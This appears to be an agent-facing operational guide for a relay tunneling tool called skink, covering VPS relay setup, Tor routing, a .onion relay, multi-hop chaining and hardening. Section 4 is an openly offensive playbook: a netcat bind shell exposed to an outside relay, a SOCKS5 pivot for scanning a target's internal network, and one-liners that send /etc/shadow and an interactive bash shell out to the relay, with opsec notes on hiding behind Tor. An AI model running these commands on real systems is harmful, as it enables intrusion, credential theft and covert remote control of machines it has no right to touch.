# Skink — operational scenarios

Companion to `SKILL.md`. The deep, multi-step patterns an agent needs for pentest / ops / VPS deployment work. Assumes the `skink` binary is in PATH and the gotchas in `SKILL.md` are already internalized (global flags before subcommand; data port `9091` = control `9090`+1; `--transport tcp|wss` for proxying; HTTP tunnels need `Host`+`Authorization` headers).

## Contents

1. [VPS relay install + firewall](#1-vps-relay-install--firewall)
2. [Tor: route skink through Tor (client side)](#2-tor-route-skink-through-tor-client-side)
3. [Tor: run the relay as a `.onion` hidden service](#3-tor-run-the-relay-as-a-onion-hidden-service)
4. [Reverse shell — three patterns](#4-reverse-shell--three-patterns)
5. [Multi-hop relay chaining](#5-multi-hop-relay-chaining)
6. [Hardening checklist](#6-hardening-checklist)
7. [Opsec notes](#7-opsec-notes)

---

## 1. VPS relay install + firewall

The relay is the public meeting point. It must run on a host with a public IP (a VPS). **No port forwarding is needed** — the VPS is already publicly reachable; you only open firewall / cloud security-group rules.

```bash
# On the VPS
curl -L -o skink.tar.gz https://github.com/octagono/skink/releases/latest/download/skink-linux-amd64.tar.gz
tar xzf skink.tar.gz
sudo install skink-linux-amd64 /usr/local/bin/skink

# Set a real password (NEVER leave the default pass123)
echo 'SKINK_PASS=long-random-secret' >> /etc/skink.env

# Run (systemd unit recommended — see below)
SKINK_PASS=$(grep ^SKINK_PASS /etc/skink.env | cut -d= -f2) skink relay \
  --tunnel-port 9090 --tunnel-http-port 8080
```

Firewall / security-group ports to open (both directions):
- `9009-9013/tcp` — file transfer
- `9090/tcp` — tunnel control (PAKE + registration)
- `9091/tcp` — tunnel DATA (yamux). **Not in any flag, = control+1.** Easy to forget.
- `8080/tcp` — tunnel HTTP proxy (only if you use HTTP tunnels)
- `9092/tcp` — metrics (optional, restrict to monitoring IP)

systemd unit (`/etc/systemd/system/skink-relay.service`):
```ini
[Unit]
Description=Skink relay
After=network-online.target

[Service]
EnvironmentFile=/etc/skink.env
ExecStart=/usr/local/bin/skink relay --tunnel-port 9090 --tunnel-http-port 8080
Restart=on-failure
User=nobody
AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```
`systemctl enable --now skink-relay`.

## 2. Tor: route skink through Tor (client side)

Use when the skink CLIENT (sender, receiver, or tunnel client) should reach a relay via Tor. Requires a local Tor SOCKS5 listener (default `127.0.0.1:9050`).

```bash
# 1. Start Tor (or install via your package manager)
tor &   # listen on 127.0.0.1:9050

# 2. Send a file to an .onion relay
skink --socks5 127.0.0.1:9050 send --relay abcdefghijklmnop.onion:9009 file.txt

# 3. Open a tunnel to an .onion relay (force tcp/wss transport; QUIC can't go through Tor)
skink --socks5 127.0.0.1:9050 tunnel --server abcdefghijklmnop.onion:9090 \
      --type tcp --transport tcp --local localhost:22
```

Rules:
- `--socks5` is a GLOBAL flag — goes before the subcommand.
- Remote DNS is performed by the proxy, so `.onion` resolves via Tor (no local leak).
- A localhost/LAN relay is auto-diailed direct (bypasses the proxy); to actually route through Tor the destination must be remote / `.onion`.

## 3. Tor: run the relay as a `.onion` hidden service

Runs the skink relay on a VPS but exposes it ONLY as a `.onion` address — no public TCP port, no public IP needed on the relay host. Clients connect through their own Tor.

`/etc/tor/torrc` on the relay host:
```
HiddenServiceDir /var/lib/tor/skink-relay/
HiddenServicePort 9009 127.0.0.1:9009
HiddenServicePort 9090 127.0.0.1:9090
HiddenServicePort 9091 127.0.0.1:9091
HiddenServicePort 8080 127.0.0.1:8080
```
```bash
systemctl reload tor
cat /var/lib/tor/skink-relay/hostname    # e.g. abcdefghijklmnop.onion

# Bind skink to loopback only (Tor forwards to it)
SKINK_PASS=secret skink relay \
  --tunnel-port 9090 --tunnel-http-port 8080
```
Client side:
```bash
skink --socks5 127.0.0.1:9050 send --relay abcdefghijklmnop.onion:9009 file.txt
```
Remember to map BOTH `9090` (control) AND `9091` (data) in torrc — forgetting `9091` makes tunnel/scan/exec hang.

## 4. Reverse shell — three patterns

All three assume a relay you control (`relay:9090`, password `SECRET`). The operator is you; the target is the machine you have a foothold on.

### Pattern A — skink on the target (bind shell via tunnel)

On the TARGET (outbound-only — punches NAT, no listening port on the target's WAN):
```bash
# 1. Start a bind shell on the target listening locally
nc -lk 127.0.0.1 4444 -e /bin/bash            # or: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash

# 2. Expose it through a tunnel to the relay
skink --pass SECRET tunnel --server relay:9090 \
      --type tcp --local localhost:4444
# -> skink prints: "public tcp endpoint: relay:XXXXX"
```
On the OPERATOR side:
```bash
# Relay allocates a public port; connect to it
nc relay.example 13337        # using the printed port
```
The target made only OUTBOUND connections to the relay; its firewall saw no inbound.

### Pattern B — SOCKS5 pivot (whole-network reach)

On the TARGET:
```bash
skink --pass SECRET tunnel --server relay:9090 --type socks5
# -> "public socks5 endpoint: relay:13337"
```
On the OPERATOR side, pivot the whole internal network of the target:
```bash
proxychains -x nmap -sT -Pn -p 22,445,3389 10.0.1.0/24
# or:
curl --socks5 relay.example:13337 http://internal-target.local/
```
Combine with `skink exec` against the same relay for structured enumeration.

### Pattern C — no skink on the target (classic)

When you can only execute one-liners on the target (RCE, CI leak, etc.):
```bash
# On the OPERATOR (reachable host):
skink --relay relay:9009             # you are the receiver; enter the code at the prompt
# Target pushes a file (exfil) or streams its shell:
bash -c 'skink send --relay relay:9009 --code ABCD-...' /etc/shadow
# or pipe a shell:
mkfifo /tmp/p; bash -i 2>&1 < /tmp/p | skink send --relay relay:9009 --code CODE /tmp/p
```
This is the only pattern where the target's network must be able to reach the relay directly (or through `--socks5`).

## 5. Multi-hop relay chaining

Skink tunnel clients can chain through a relay to reach ANOTHER relay (multi-hop). The first relay dials the next via `comm.Dial`, so the whole chain honors `--socks5`/`--connect` on the FIRST hop.

Topology: `target -> relay1 (public) -> relay2 (internal/.onion) -> operator`.

On `relay1` (the public entry), configure it to forward unknown tunnel registrations to `relay2` via the relay-hop subsystem (see `src/tunnel/relayhop.go`). Then on the target:
```bash
skink --pass SECRET tunnel --server relay1.example:9090 \
      --type tcp --local localhost:4444 \
      --transport tcp            # multi-hop only works over tcp/wss
```
The operator connects to the port allocated on `relay1`; traffic is spliced through to `relay2` and onward to the target. Each hop contributes its own TLS/Noise layer.

## 6. Hardening checklist

- [ ] Set `SKINK_PASS` to a long random secret; never deploy with the default `pass123`.
- [ ] Run the relay under a dedicated unprivileged user (`User=nobody` in systemd).
- [ ] Restrict `9092` (metrics) to a monitoring IP; never expose publicly.
- [ ] Consider `--static-key` (Noise) for tunnel registration so unknown clients cannot register even with the passphrase.
- [ ] Use `--private` tunnels for sensitive services (token-only access, no public port allocated).
- [ ] Put the relay behind fail2ban on `9090` if you see registration spam.
- [ ] For maximum stealth, run the relay as a `.onion` hidden service (section 3) — no public TCP port at all.
- [ ] Rotate `SKINK_PASS` periodically; it is the single shared credential for file transfer.

## 7. Opsec notes

Honest constraints every operator should know:
- **Relay is a single point of trust.** Whoever controls the relay sees connection metadata (src IP, timestamps, codephrases) but NOT file/stream contents (end-to-end PAKE + XChaCha20-Poly1305 between peers).
- **`--socks5`/`--connect` hide the client from the relay**, not the relay from the client. The relay still knows its own address.
- **QUIC cannot go through Tor** — they are UDP. Force `--transport tcp|wss` for Tor routing.
- **Local addresses bypass the proxy by design** (loopback/LAN). To force proxy routing for testing, target a non-local host.
- **`.onion` relays require both `9090` and `9091` mapped in torrc.** Missing `9091` is silent breakage.
- **Codephrases are generated by `mnemonicode` and are not high-entropy.** Treat the relay + codephrase as "obfuscation, not auth"; the real secret is `SKINK_PASS` + (optionally) Noise static keys.
